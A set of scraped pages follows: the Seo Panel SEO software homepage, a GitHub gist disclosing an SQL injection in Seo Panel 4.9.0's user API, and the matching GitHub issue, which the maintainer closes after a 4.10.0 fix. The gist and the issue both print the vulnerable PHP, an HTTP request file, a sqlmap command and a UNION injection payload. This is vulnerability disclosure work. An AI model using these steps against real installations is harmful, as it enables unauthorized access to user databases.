=== Content from www.seopanel.org_5b562ba2_20250114_230132.html ===


[![](https://www.seopanel.org/images/logo_red_sm.png)](https://www.seopanel.org)

[Download ⇓](https://www.seopanel.org/download/)

* [Installation](https://www.seopanel.org/install/ "Seo Panel Installation")
* [Docs](https://www.seopanel.org/docs/ "Seo Panel Docs")
* [Demo](https://www.seopanel.org/demo/ "Seo Panel Demo")
* [Donate](https://www.seopanel.org/donate/ "Donate Seo Panel")
* [Extensions](https://www.seopanel.org/plugins/)
  + [Plugins](https://www.seopanel.org/plugins/ "seo panel plugins")
  + [Themes](https://www.seopanel.org/themes/ "seo panel themes")
  + [Hosting](https://www.seopanel.org/webhosting/ "Seo Panel Hosting")
  + [Proxies](https://www.seopanel.org/proxies/ "Seo Panel Hosting")
* [Blog](https://www.seopanel.org/blog/ "Seo Panel Blog")
* [Support](https://www.seopanel.org/support/)
  + [Contact Us](https://www.seopanel.org/contact/ "Contact Seo Panel")
  + [Helpdesk](http://support.seofreetools.net/)
  + [Docs](https://www.seopanel.org/docs/ "Seo Panel Help")
  + [Hosting](https://www.seopanel.org/webhosting/ "Seo Panel Hosting")
  + [Proxies](https://www.seopanel.org/proxies/ "Seo Panel Hosting")
  + [Blog](https://www.seopanel.org/blog/ "Seo Panel Blog")
  + [Forum](http://forum.seopanel.in/ "Seo Panel Forum")
  + [Seo Services](https://www.seopanel.org/seo-services/ "Seo services")
  + [Support Services](https://www.seopanel.org/support/ "Seo Panel Support")
* [About](https://www.seopanel.org/aboutus/)
  + [About Us](https://www.seopanel.org/aboutus/ "About Us")
  + [Sponsors](https://www.seopanel.org/aboutus/sponsors/ "Seo Panel Sponsors")
  + [Reviews](https://www.seopanel.org/reviews/ "Seo Panel Reviews")
* [Contact Us](https://www.seopanel.org/contact/ "Contact Seo Panel")
* [Login](https://www.seopanel.org/login/ "Seo Panel login")

![](https://www.seopanel.org/images/seo_lg.png)

World's first SEO Control Panel for Multiple
Websites
An Award Winning open source seo
control panel for managing search engine optimization of your
websites.

[Download ⇓](https://www.seopanel.org/download/)
[Demo ⇒](https://www.seopanel.org/demo/)

[![](https://www.seopanel.org/images/vide.png)](https://www.youtube.com/watch?v=pVjoJDbi9KI)

[![](https://www.seopanel.org/images/seo_ad.jpg)](https://www.seopanel.org/blog/2011/11/seo-panel-1st-runner-up-in-2011-open-source-awards-as-most-promising-project/)

[![GoodFirms Badge](https://goodfirms.s3.amazonaws.com/badges/color-badge/seo-software.svg)](https://www.goodfirms.co/software/seo-panel)
[![](https://www.seopanel.org/images/inst.jpg)](https://www.seopanel.org/download/)

### Download Seo Panel

Take care of running Seo Panel yourself by installing it on your
own server. There is no cost for Seo Panel itself but you need a
server and update Seo Panel & your server regularly to keep it
fast and secure.

[Download Seo Panel 4.11.0](https://www.seopanel.org/spdownload/)
[Installation Guide](https://www.seopanel.org/install/)

[See what’s new in this release](https://www.seopanel.org/blog/)

### Cloud Hosted Seo Panel

Take away the hassle of running Seo
Panel yourself and skip the technical setup, the maintenance work
and server cost by getting Seo Panel on our reliable and secure Cloud.
You also get support directly from the makers of Seo Panel.

Signup Now >>
Learn more

See Pricing

# Major Features Seo Panel Software

![](https://www.seopanel.org/images/mb_1.jpg)

Automatic Directory Submission Tool
Automatic directory submission tool help
us to submit our websites into to major free and paid internet
directories. We can also track the status of each submision
through periodical check using submission status checker
script.

![](https://www.seopanel.org/images/mb_2.jpg)

Site Auditor
Site Auditor will audit all SEO factors of
each pages of a site and will give a detailed report about each
page. This will help us to create XML,HTML,TEXT sitemap files
of our website for submit to search engines.

![](https://www.seopanel.org/images/mb_5.jpg)

MOZ Rank Checker
It will find
MOZ page rank, Domain Authority, Page Authority and Backlinks of our websites and stores it in
the system. In rank reports section, we can see the daily
MOZ rank of each website by detailed reports.

![](https://www.seopanel.org/images/mb_4.jpg)

Keyword Position Checker
Keyword position checker will find the
search engine position of targetted keywords of your website
and stores it in the system. In keyword position reports
section, we can see the daily positions of keywords in
different search engines by beautiful graphs and detailed reports.

![](https://www.seopanel.org/images/mb_6.jpg)

Search Engine Saturation Checker
Search Engine Saturation checker will find
number of indexed pages of our websites in different search
engines like google, yahoo, msn etc and stores it in the system.

![](https://www.seopanel.org/images/mb_5.jpg)

PageSpeed Insights
Page Speed Checker checker will find
Desktop Speed, Mobile Speed and Mobile Usability of our websites and stores it in the system.

![](https://www.seopanel.org/images/mb_5.jpg)

Google and Alexa Rank Checker
Google and alexa rank checker will find
google pagerank and alexa rank of our websites and stores it in
the system. In rank reports section, we can see the daily
google and alexa rank of each website by detailed reports.

![](https://www.seopanel.org/images/mb_2.jpg)

Webmaster Tools
Webmaster Tools will find
search clicks, impression and position of our websites and keywords and stores it in
the system.In rank reports section, we can see the daily
statistics of each website by detailed reports.

![](https://www.seopanel.org/images/mb_3.jpg)

Backlinks Checker
Backlinks checker will find number of
backlinks of our websites in different search
engines like google, yahoo, msn etc and stores it in the system. In
backlink reports section, we can see the daily backlinks count
of each website by detailed reports.

[Read more about SEO Panel Software](https://www.seopanel.org/seo-services/)

TESTIMONIALS
It's fantastic to have in just only one screen all the information SEO of my clients. It's one of the best script that exist in Internet and it count with all my human support and financier, to help in his development.
Great tool, Geo... Thank you..
Daniel Varela, [facilplan.com](http://www.facilplan.com)

[Read all reviews](https://www.seopanel.org/reviews/)

A friend turned me onto this site. One of the best open source projects out there. It has helped me out a lot..
Troy Glancy, [larismedia.com](http://www.larismedia.com)

[Read all reviews](https://www.seopanel.org/reviews/)

Very Impressive. Once set up is very easy to use and very helpful. I have All Plugin Tool installed on my Seo Panel and works fantastic. Everyone who's interested to improve his web site should have it. Incredible. Thank you Seo Panel, Alan.
May 28, 2015
Los Angeles, CA..
Alan Douglas, [ad47usa.com](http://www.ad47usa.com)

[Read all reviews](https://www.seopanel.org/reviews/)

LATEST NEWS
Seo Panel 4.11.0 released

[Read all News](https://www.seopanel.org/blog/)

SUBSCRIBE TO NEWSLETTER
We'll send you updates about newest releases,
freebies, or new opportunities.
Enter Your Email

[![](https://www.seopanel.org/images/tw.jpg)](https://twitter.com/seopanel)

[![](https://www.seopanel.org/images/fb.jpg)](https://www.facebook.com/seopanel)

[![](https://www.seopanel.org/images/yt.jpg)](http://www.youtube.com/user/seopanel)

[![](https://www.seopanel.org/images/rs.jpg)](https://www.seopanel.org/blog/feed/)

Quick Links
[Download](https://www.seopanel.org/download/ "Download Seo Panel")
[Installation](https://www.seopanel.org/install/ "Seo Panel Installation")
[Demo](https://www.seopanel.org/demo/ "Seo Panel Demo")
[Plugins](https://www.seopanel.org/plugins/ "Seo Panel Plugins")
[Become Sponsor?](https://www.seopanel.org/aboutus/sponsors/ "Become Sponsor?")

Information
[Seo Panel Subscription](https://www.seopanel.net "Seo Panel Subscription")
[About Us](https://www.seopanel.org/aboutus/ "About Us")
[Blog](https://www.seopanel.org/blog/ "Seo Panel Blog")
[Help](https://www.seopanel.org/docs/ "Seo Panel Help")
[Terms of Use](https://www.seopanel.org/install/terms/ "Seo Panel terms")

Support
[Contact Us](https://www.seopanel.org/contact/ "Contact Seo Panel")
[Forum](http://forum.seopanel.in/ "Seo Panel Forum")
[Helpdesk](http://support.seofreetools.net/)
[Support](https://www.seopanel.org/support/)
[Reviews](https://www.seopanel.org/reviews/ "Seo Panel Reviews")

[Credits](https://www.seopanel.org/donate/ "Donate Seo Panel")
[Github project](https://github.com/seopanel/)
[Sourceforge project](http://www.sourceforge.net/projects/seopanel)
[Host It](https://www.seopanel.org/webhosting/ "Seo Panel Hosting")

![](https://www.seopanel.org/images/logo_red_sm.png)
Mission
Seo Panel for each webmaster in world
Vision
To become the best SEO software in the world

[Cloud Hosted Seo Panel](https://www.seopanel.net)
[SEO Software](https://www.seopanel.org)

© Copyright 2025 www.seopanel.in. All rights reserved.



=== Content from gist.github.com_04529f42_20250114_230130.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fa0d47d6982a7b382f632ec7e8c3307f1)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fa0d47d6982a7b382f632ec7e8c3307f1&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fa0d47d6982a7b382f632ec7e8c3307f1) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fa0d47d6982a7b382f632ec7e8c3307f1&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@victomteng1997](https://avatars.githubusercontent.com/u/25191772?s=64&v=4)](/victomteng1997)

# [victomteng1997](/victomteng1997)/**[SeoPanel\_SQL\_Injection.md](/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1)**

Last active
June 7, 2021 10:04

Show Gist options

* [Download ZIP](/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1/archive/1993d44e1763f8beb5efafc13b1e25836540cd81.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fa0d47d6982a7b382f632ec7e8c3307f1)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fa0d47d6982a7b382f632ec7e8c3307f1)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1.js&quot;&gt;&lt;/script&gt;
* Save victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1 to your computer and use it in GitHub Desktop.

[Code](/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1)
[Revisions
3](/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1.js&quot;&gt;&lt;/script&gt;

Save victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1 to your computer and use it in GitHub Desktop.

[Download ZIP](/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1/archive/1993d44e1763f8beb5efafc13b1e25836540cd81.zip)

Seo Panel 4.9.0 and below SQL Injection

 [Raw](/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1/raw/1993d44e1763f8beb5efafc13b1e25836540cd81/sample_injection_traffic.png)

[**sample\_injection\_traffic.png**](#file-sample_injection_traffic-png)

![sample_injection_traffic.png](https://gist.github.com/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1/raw/1993d44e1763f8beb5efafc13b1e25836540cd81/sample_injection_traffic.png)

 [Raw](/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1/raw/1993d44e1763f8beb5efafc13b1e25836540cd81/SeoPanel_SQL_Injection.md)

[**SeoPanel\_SQL\_Injection.md**](#file-seopanel_sql_injection-md)

# Seo Panel SQL Injection Vulnerability

SeoPanel Official Website: <https://www.seopanel.org/>

Github: <https://github.com/seopanel/Seo-Panel>

Latest version 4.9.0: <https://www.seopanel.org/spdownload/>, <https://github.com/seopanel/Seo-Panel/tree/7c107c789be74bdb284f857cd6a51877f0e0c11b>, or the file attached to this gist below.

# vulnerability description:

In `api/user.api.php`, the function `getUserName` directly calls function `__checkUserName` in `controllers/user.ctrl.php` file without filtering on variables. Attacker can pass arbitrary string to `username` variable through `$info`. This allows injection to the `__checkUsername` function directly:

getUserName:

```
function getUserName($info) {

         		$username = $info['username'];
        		$returnInfo = array();
        		// validate the user ifd and user info
     		        if (!empty($username)) {
        			if ($userInfo = $this->ctrler->__checkUserName($username)) {
        				$returnInfo['response'] = 'success';

        				$returnInfo['result'] = $userInfo;

        				return $returnInfo;

        			}

        		}

        		$returnInfo['response'] = 'Error';
        		$returnInfo['error_msg'] = "Invalid username provided";
        		return  $returnInfo;
        	}

```

\_\_checkUserName:

```
	function __checkUserName($username){
         		$sql = "select id from users where username='$username'";
        		$userInfo = $this->db->select($sql, true);
        		return empty($userInfo['id']) ? false :  $userInfo['id'];
        	}

```

The above-mentioned vulnerability can be reproduced by sqlmap through a request file `injection.txt`:

```
POST /seopanel/api/api.php HTTP/1.1
Host: localhost
Accept: */*
Content-Length: 118
Content-Type: application/x-www-form-urlencoded
Connection: close

SP_API_KEY=<key_here>&API_SECRET=<secret>&category=user&action=getUserName&username=spadmin

```

with sqlmap command: `sqlmap -r injection.txt -p 'username'`. A boolean-based blind injection shall work, with payload similar to:
`username=123' UNION ALL SELECT CONCAT(CONCAT('abc','abc'),'abc')--`  (do note that there's one space at the end of variable to bypass the original quotation mark).

 [Raw](/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1/raw/1993d44e1763f8beb5efafc13b1e25836540cd81/seopanel.v.4.9.0.zip)

[**seopanel.v.4.9.0.zip**](#file-seopanel-v-4-9-0-zip)

This file has been truncated, but you can [view the full file](https://gist.github.com/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1/raw/1993d44e1763f8beb5efafc13b1e25836540cd81/seopanel.v.4.9.0.zip).

[View raw](https://gist.github.com/victomteng1997/a0d47d6982a7b382f632ec7e8c3307f1/raw/1993d44e1763f8beb5efafc13b1e25836540cd81/seopanel.v.4.9.0.zip)

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fvictomteng1997%2Fa0d47d6982a7b382f632ec7e8c3307f1)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_9f411b5e_20250114_230130.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fseopanel%2FSeo-Panel%2Fissues%2F219)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fseopanel%2FSeo-Panel%2Fissues%2F219)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=seopanel%2FSeo-Panel)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[seopanel](/seopanel)
/
**[Seo-Panel](/seopanel/Seo-Panel)**
Public

forked from [sendtogeo/Seo-Panel](/sendtogeo/Seo-Panel)

* [Notifications](/login?return_to=%2Fseopanel%2FSeo-Panel) You must be signed in to change notification settings
* [Fork
  39](/login?return_to=%2Fseopanel%2FSeo-Panel)
* [Star
   114](/login?return_to=%2Fseopanel%2FSeo-Panel)

* [Code](/seopanel/Seo-Panel)
* [Issues
  36](/seopanel/Seo-Panel/issues)
* [Pull requests
  3](/seopanel/Seo-Panel/pulls)
* [Actions](/seopanel/Seo-Panel/actions)
* [Projects
  0](/seopanel/Seo-Panel/projects)
* [Wiki](/seopanel/Seo-Panel/wiki)
* [Security](/seopanel/Seo-Panel/security)
* [Insights](/seopanel/Seo-Panel/pulse)

Additional navigation options

* [Code](/seopanel/Seo-Panel)
* [Issues](/seopanel/Seo-Panel/issues)
* [Pull requests](/seopanel/Seo-Panel/pulls)
* [Actions](/seopanel/Seo-Panel/actions)
* [Projects](/seopanel/Seo-Panel/projects)
* [Wiki](/seopanel/Seo-Panel/wiki)
* [Security](/seopanel/Seo-Panel/security)
* [Insights](/seopanel/Seo-Panel/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fseopanel%2FSeo-Panel%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fseopanel%2FSeo-Panel%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# SQL Injection Vulnerability in API function (user.api.php) #219

Closed

[victomteng1997](/victomteng1997) opened this issue
Jun 7, 2021
· 2 comments

Closed

# [SQL Injection Vulnerability in API function (user.api.php)](#top) #219

[victomteng1997](/victomteng1997) opened this issue
Jun 7, 2021
· 2 comments

Assignees
[![@sendtogeo](https://avatars.githubusercontent.com/u/281293?s=40&v=4)](/sendtogeo)

Labels
[bug](/seopanel/Seo-Panel/labels/bug)

Milestone
[4.10.0](/seopanel/Seo-Panel/milestone/20 "4.10.0")

## Comments

[![@victomteng1997](https://avatars.githubusercontent.com/u/25191772?s=80&u=30e77c5470c0cb2ebc5dfad07ce42733755e92d3&v=4)](/victomteng1997)

Copy link

### **[victomteng1997](/victomteng1997)** commented [Jun 7, 2021](#issue-913356105)

| Hi there,  I want to report a SQL Injection Vulnerability in the the current API implementation of Seo-Panel. In `api/user.api.php`, the function `getUserName` directly calls function `__checkUserName` in `controllers/user.ctrl.php` file without filtering on variables. Attacker can pass arbitrary string to `username` variable through `$info`. This allows injection to the `__checkUsername` function directly:  getUserName:  ``` function getUserName($info) {               		$username = $info['username'];          		$returnInfo = array();               		// validate the user ifd and user info      		        if (!empty($username)) {               			if ($userInfo = $this->ctrler->__checkUserName($username)) {               				$returnInfo['response'] = 'success';             				$returnInfo['result'] = $userInfo;               				return $returnInfo;              			}                		}              		$returnInfo['response'] = 'Error';               		$returnInfo['error_msg'] = "Invalid username provided";               		return  $returnInfo;         	}  ```  \_\_checkUserName:  ``` 	function __checkUserName($username){          		$sql = "select id from users where username='$username'";           		$userInfo = $this->db->select($sql, true);               		return empty($userInfo['id']) ? false :  $userInfo['id'];               	}  ```  The above-mentioned vulnerability can be reproduced by sqlmap through a request file `injection.txt`:  ``` POST /seopanel/api/api.php HTTP/1.1 Host: localhost Accept: */* Content-Length: 118 Content-Type: application/x-www-form-urlencoded Connection: close  SP_API_KEY=<key_here>&API_SECRET=<secret>&category=user&action=getUserName&username=spadmin  ```  with sqlmap command: `sqlmap -r injection.txt -p 'username'`. A boolean-based blind injection shall work, with payload similar to: `username=123' UNION ALL SELECT CONCAT(CONCAT('abc','abc'),'abc')--`  (do note that there's one space at the end of variable to bypass the original quotation mark). |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@sendtogeo](https://avatars.githubusercontent.com/u/281293?s=80&v=4)](/sendtogeo)

Copy link

### **[sendtogeo](/sendtogeo)** commented [Jun 7, 2021](#issuecomment-855811710)

| Thanks a lot for finding it and updating us.  Thanks for your great support.  We will release fix for it in this month release 4.10.0 version 👍 |
| --- |

All reactions

Sorry, something went wrong.

[![@sendtogeo](https://avatars.githubusercontent.com/u/281293?s=40&v=4)](/sendtogeo)
[sendtogeo](/sendtogeo)
added this to the [4.10.0](/seopanel/Seo-Panel/milestone/20) milestone
[Jun 7, 2021](#event-4851111839)

[![@sendtogeo](https://avatars.githubusercontent.com/u/281293?s=40&v=4)](/sendtogeo)
[sendtogeo](/sendtogeo)
self-assigned this
[Jun 7, 2021](#event-4851112364)

[![@sendtogeo](https://avatars.githubusercontent.com/u/281293?s=40&v=4)](/sendtogeo)
[sendtogeo](/sendtogeo)
added
the
[bug](/seopanel/Seo-Panel/labels/bug)
label
[Jun 7, 2021](#event-4851112801)

[sendtogeo](/sendtogeo)
pushed a commit
that referenced
this issue
[Aug 29, 2021](#ref-commit-f17c424)

`[#219](https://github.com/seopanel/Seo-Panel/issues/219) [fixed sql injection in api](/seopanel/Seo-Panel/commit/f17c42476b3a1b5225ecc6d1bd22245183793c61 "#219 fixed sql injection in api")`

`[f17c424](/seopanel/Seo-Panel/commit/f17c42476b3a1b5225ecc6d1bd22245183793c61)`

[![@sendtogeo](https://avatars.githubusercontent.com/u/281293?s=80&v=4)](/sendtogeo)

Copy link

### **[sendtogeo](/sendtogeo)** commented [Aug 29, 2021](#issuecomment-907859603)

| Fixed i the latest version 4.10.0 |
| --- |

All reactions

Sorry, something went wrong.

[![@sendtogeo](https://avatars.githubusercontent.com/u/281293?s=40&v=4)](/sendtogeo)
[sendtogeo](/sendtogeo)
closed this as [completed](/seopanel/Seo-Panel/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Aug 29, 2021](#event-5223088997)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fseopanel%2FSeo-Panel%2Fissues%2F219)

Assignees

[![@sendtogeo](https://avatars.githubusercontent.com/u/281293?s=40&v=4)](/sendtogeo) [sendtogeo](/sendtogeo)

Labels

[bug](/seopanel/Seo-Panel/labels/bug)

Projects

None yet

Milestone

 [**4.10.0**](/seopanel/Seo-Panel/milestone/20 "4.10.0")

Development

No branches or pull requests

2 participants

[![@sendtogeo](https://avatars.githubusercontent.com/u/281293?s=52&v=4)](/sendtogeo) [![@victomteng1997](https://avatars.githubusercontent.com/u/25191772?s=52&v=4)](/victomteng1997)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


